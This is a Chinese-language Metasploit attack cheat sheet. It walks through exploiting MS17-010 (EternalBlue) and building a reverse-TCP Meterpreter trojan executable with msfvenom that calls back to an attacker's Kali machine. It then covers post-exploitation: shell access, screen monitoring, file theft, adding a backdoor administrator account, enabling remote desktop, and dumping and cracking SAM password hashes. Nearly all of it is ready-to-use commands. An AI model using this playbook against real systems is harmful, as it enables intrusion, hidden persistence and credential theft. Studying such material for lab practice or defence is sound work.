[toc]
# msfconsole攻击
## 一、漏洞利用
### 1.ms17-010
 search ms17-010	//搜索插件
use exploit/windows/smb/ms17_010_eternalblue  //use利用这个插件，也可以用序号的方式
set rhost 192.168.1.1		//设置靶机的ip
set rport 445		//设置端口


## 二、生成木马文件攻击
1.生成木马

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.107.132 lport=6789 -f exe -o /root/yhdxtn.exe

注意：这里的ip是kali的ip(192.168.107.132 ) 。

          端口是6789



2.输入msfconsole命令启动Metasploit工具



3.使用handler

use exploit/multi/handler



4.设置payload为刚才反向远程控制程序名称

set payload windows/meterpreter/reverse_tcp



5.设置一个IP(lhost)和端口(lport)

set lhost 192.168.107.132

set lport 6789





6.执行“exploit”开启监听


## 三、meterpreter 下攻击
#### 1.打开cmd
shell 
如果乱码可以输入chcp 65001更改编码
#### 2.监控屏幕
run vnc
#### 3.文件传输
meterpreter > download c:\\system.hive 
#### 4.开启远程控制
run getgui -e
#### 5.破解密码
a、msfconsole链接到目标靶机
  shell下建用户
net user  tanglx 1234 /add
  shell下设为管理员权限
net localgroup administrators tanglx /add
  meterpreter >下开启远程登录
run getgui -e

b、之后remmina里面远程登录这个用户，导出注册表里面的用户信息，进行破解用户密码
1.用管理员权限打开cmd
2.cmd下输入
reg save hklm/sam c:\sam.hive
reg save hklm/system c:\system.hive

c、破解计算机用户密码
1.msfconsole下输入下面两条命令下载靶机c盘下的注册表文件
meterpreter > download c:\\sam.hive          
meterpreter > download c:\\system.hive        
2.打开kali
samdump2 system.hive sam.hive >> pass
john --format=NT pass        
